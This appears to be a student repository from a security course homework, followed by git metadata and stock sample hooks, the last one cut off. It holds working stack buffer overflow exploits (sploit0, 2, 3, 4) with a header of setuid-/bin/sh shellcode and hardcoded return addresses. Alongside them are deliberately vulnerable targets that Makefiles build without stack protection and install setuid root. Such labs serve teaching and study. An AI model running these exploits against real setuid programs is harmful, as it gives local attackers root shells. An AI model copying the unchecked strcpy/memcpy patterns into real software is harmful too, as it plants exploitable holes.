#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[424];
  memset(buf, 0x90, 424);
  memcpy(buf+200, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 412);
  *addr_ptr++ = 0xffffcf5c;
  *addr_ptr++ = 0xffffcf5c;  
  *addr_ptr++ = 0xffffcf5c;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit1</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit0</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit2</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
  input_size = atoi(argv[2]);
  if( real_size > input_size ) 
  {
    fprintf(stderr, "Error: real_size larger than input_size\n" );
    exit(EXIT_FAILURE);
  }

  greeting( argv[1], input_size );
  printf( "Bye %s\n", argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target2.c>
<START OF ./cs5435-hw4/targets/Makefile>
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -no-pie -fno-pie -m32 
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pie -m32

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile>
<START OF ./cs5435-hw4/targets/target1.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strncpy(name, temp, 12);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target1.c>
<START OF ./cs5435-hw4/targets/Makefile-arm>
CC := arm-linux-gnueabi-gcc 
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -zexecstack -fno-stack-protector -no-pie -fno-pie
CFLAGSNOEXEC := -fno-stack-protector -no-pie -fno-pie

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)

<END OF ./cs5435-hw4/targets/Makefile-arm>
<START OF ./cs5435-hw4/targets/target4.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void foo( char* temp )
{
  char name[4];

  strcpy(name, temp);
}


int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }

  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target4.c>
<START OF ./cs5435-hw4/targets/target0.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/targets/target0.c>
<START OF ./cs5435-hw4/targets/target3.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void copyFourInts( char *values )
{  
  int intvalues[4];
  memcpy((char*)intvalues, values, sizeof(int)*5);
}

void foo( char* values )
{
  copyFourInts( values );
}

int main(int argc, char* argv[] ) 
{
  if( argc != 2 )
  {
    fprintf(stderr, "meet: argc != 2\n");
    exit(EXIT_FAILURE);
  }
  
  foo( argv[1] );
  return 0;
}


<END OF ./cs5435-hw4/targets/target3.c>
<START OF ./.git/config>
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
[remote "origin"]
	url = https://github.com/justinhalford/h4.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

<END OF ./.git/config>
<START OF ./.git/HEAD>
ref: refs/heads/main

<END OF ./.git/HEAD>
<START OF ./.git/description>
Unnamed repository; edit this file 'description' to name the repository.

<END OF ./.git/description>
<START OF ./.git/COMMIT_EDITMSG>
Initial commit of project files

<END OF ./.git/COMMIT_EDITMSG>
<START OF ./.git/info/exclude>
# git ls-files --others --exclude-from=.git/info/exclude
# Lines that start with '#' are comments.
# For a project mostly in C, the following would be a good set of
# exclude patterns (uncomment them if you want to use them):
# *.[oa]
# *~

<END OF ./.git/info/exclude>
<START OF ./.git/logs/HEAD>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 0000000000000000000000000000000000000000 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/HEAD>
<START OF ./.git/logs/refs/heads/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899418 -0400	commit (initial): Initial commit
5eef708ef223be75f74e68d36cedffcf5484f284 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899479 -0400	Branch: renamed refs/heads/master to refs/heads/main
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902046 -0400	commit: Initial commit
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753685 -0400	commit: Initial commit of project files

<END OF ./.git/logs/refs/heads/main>
<START OF ./.git/logs/refs/remotes/origin/master>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899467 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
